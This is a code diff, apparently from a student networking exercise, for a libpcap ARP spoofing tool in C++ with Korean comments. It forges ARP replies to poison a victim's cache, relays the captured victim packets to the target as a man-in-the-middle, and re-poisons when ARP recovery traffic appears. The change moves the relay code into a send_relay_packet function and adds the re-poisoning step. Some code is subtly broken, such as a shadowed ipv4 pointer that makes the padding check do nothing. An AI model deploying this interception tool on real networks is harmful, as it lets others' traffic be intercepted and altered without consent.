@@ -47,6 +47,11 @@ void arp_infection(
 
 void receive_arp(int c, const char* sender_ip);
 
+void send_relay_packet(
+    pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* header,
+    ETHERNET_HDR* eth, const char* target_mac, const char* my_mac
+);
+
 bool getMyMacAddress(const char* interface, char* mac_str);
 bool getMyIpAddress(const char* interface, char* ip_str);
 void print_packet(const u_char* packet, u_int32_t packet_len);
@@ -65,69 +70,58 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	char my_mac[18];
-	char my_ip[16];
+    /* my mac & ip */
+	char my_mac[18], my_ip[16];
 	getMyMacAddress(argv[1], my_mac);
 	getMyIpAddress(argv[1], my_ip);
 
-	while (1){
-        char sender_mac[18], target_mac[18];
-		for(int i = 2; i < argc; i += 2) {
-            printf("----------\n");
-            get_mac_address(pcap, argv[i], sender_mac, my_ip, my_mac);
-            get_mac_address(pcap, argv[i + 1], target_mac, my_ip, my_mac);
+    /* sender & target mac */
+    char sender_mac[18], target_mac[18];
+    for(int i = 2; i < argc; i += 2) {
+        printf("----------\n");
+        get_mac_address(pcap, argv[i], sender_mac, my_ip, my_mac);
+        get_mac_address(pcap, argv[i + 1], target_mac, my_ip, my_mac);
 
-			/* 위조 패킷 보내기 */
-			arp_infection(pcap, argv[i], sender_mac, argv[i + 1], my_mac, my_ip);
-            printf("----------\n");
-		}
+        /* 위조 패킷 보내기 */
+        arp_infection(pcap, argv[i], sender_mac, argv[i + 1], my_mac, my_ip);
+        printf("----------\n");
+    }
 
-        /* sender에서 보낸 패킷 수신 */
-        while (true) {
-            struct pcap_pkthdr* header;
-            const u_char* packet;
-            int res = pcap_next_ex(pcap, &header, &packet);
-            if (res == 0) continue;
-            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
-                break;
-            }
-            ETHERNET_HDR *eth = (ETHERNET_HDR *)packet;
-
-            /* 이더넷 헤더와 ip 헤더 사이에 바이트 패딩이 있을 경우 바이트 패딩 무시 후 구조체 포인터 캐스팅 */
-            IPV4_HDR *ipv4 = (IPV4_HDR *)(packet + sizeof(ETHERNET_HDR));
-            if ((packet + sizeof(ETHERNET_HDR))[0] == 0x00)
-                IPV4_HDR *ipv4 = (IPV4_HDR *)(packet + sizeof(ETHERNET_HDR) + 1);
-            char dst_mac[18], src_mac[18], dst_ip[16], src_ip[16];
-            bytemac_to_stringmac(eth->ether_shost, src_mac);
-            bytemac_to_stringmac(eth->ether_dhost, dst_mac);
-            byteip_to_stringip(&(ipv4->ip_src), src_ip);
-            byteip_to_stringip(&(ipv4->ip_dst), dst_ip);
-
-
-            if(strncmp(src_mac, sender_mac, 18) == 0 && strncmp(dst_mac, my_mac, 18) == 0) {
-                printf("-------------------\n");
-                printf("\nReceived reply from victim\n(from %s to %s)\n", src_ip, dst_ip);
-
-                /* 패킷을 target으로 전송 */
-                ETHERNET_HDR *infection_eth = new ETHERNET_HDR();
-                u_char* infection_packet = new u_char[header->caplen];
-
-                stringmac_to_bytemac(target_mac, infection_eth->ether_dhost);
-                stringmac_to_bytemac(my_mac, infection_eth->ether_shost);
-                infection_eth->ether_type = eth->ether_type;
-                print_ethernet(infection_eth);
-
-                memcpy(infection_packet, infection_eth, sizeof(ETHERNET_HDR));
-                memcpy(infection_packet + sizeof(ETHERNET_HDR), packet + sizeof(ETHERNET_HDR), header->caplen - sizeof(ETHERNET_HDR));
- 
-                if(pcap_sendpacket(pcap, infection_packet, header->caplen) != 0) {
-                    fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
-                }
-                delete infection_eth;
-                delete[] infection_packet;
-            }
+    /* sender에서 보낸 패킷 수신 */
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(pcap, &header, &packet);
+        if (res == 0) continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+            break;
         }
+        ETHERNET_HDR *eth = (ETHERNET_HDR *)packet;
+
+        /* 이더넷 헤더와 ip 헤더 사이에 바이트 패딩이 있을 경우 바이트 패딩 무시 후 구조체 포인터 캐스팅 */
+        IPV4_HDR *ipv4 = (IPV4_HDR *)(packet + sizeof(ETHERNET_HDR));
+        if ((packet + sizeof(ETHERNET_HDR))[0] == 0x00)
+            IPV4_HDR *ipv4 = (IPV4_HDR *)(packet + sizeof(ETHERNET_HDR) + 1);
+        char dst_mac[18], src_mac[18], dst_ip[16], src_ip[16];
+        bytemac_to_stringmac(eth->ether_shost, src_mac);
+        bytemac_to_stringmac(eth->ether_dhost, dst_mac);
+        byteip_to_stringip(&(ipv4->ip_src), src_ip);
+        byteip_to_stringip(&(ipv4->ip_dst), dst_ip);
+
+        /* 스푸핑 패킷이 맞는 경우 릴레이 패킷 생성 및 전송 */
+        if(strncmp(src_mac, sender_mac, 18) == 0 && strncmp(dst_mac, my_mac, 18) == 0) {
+            printf("-------------------\n");
+            printf("\nReceived reply from victim\n(from %s to %s)\n", src_ip, dst_ip);
+            send_relay_packet(pcap, packet, header, eth, target_mac, my_mac);
+        }
+        /* arp 복구 상황이 왔을 때 재감염 */
+        if(eth->ether_type == htons(0x0806)) {
+            printf("-------------------\n");
+            printf("\nReceived ARP reply from %s to %s\n", src_ip, dst_ip);
+            arp_infection(pcap, argv[2], sender_mac, argv[2 + 1], my_mac, my_ip);
+        }
+       
 	}
 	pcap_close(pcap);
 }
@@ -244,6 +238,30 @@ void arp_infection(
 
 void receive_arp(int c, char* sender_ip) {
 	ARP_PACKET *packet = new ARP_PACKET;
+}
+
+void send_relay_packet(
+    pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* header,
+    ETHERNET_HDR* eth, const char* target_mac, const char* my_mac
+) {
+    ETHERNET_HDR *infection_eth = new ETHERNET_HDR();
+    u_char* infection_packet = new u_char[header->caplen];
+
+    stringmac_to_bytemac(target_mac, infection_eth->ether_dhost);
+    stringmac_to_bytemac(my_mac, infection_eth->ether_shost);
+    infection_eth->ether_type = eth->ether_type;
+    print_ethernet(infection_eth);
+
+    memcpy(infection_packet, infection_eth, sizeof(ETHERNET_HDR));
+    memcpy(infection_packet + sizeof(ETHERNET_HDR), packet + sizeof(ETHERNET_HDR), header->caplen - sizeof(ETHERNET_HDR));
+
+    if(pcap_sendpacket(pcap, infection_packet, header->caplen) != 0) {
+        fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
+    } else {
+        printf("Sent ARP packet from %s to %s\n", my_mac, target_mac);
+    }
+    delete infection_eth;
+    delete[] infection_packet;
 }
 
 bool getMyMacAddress(const char* interface, char* mac_str) {
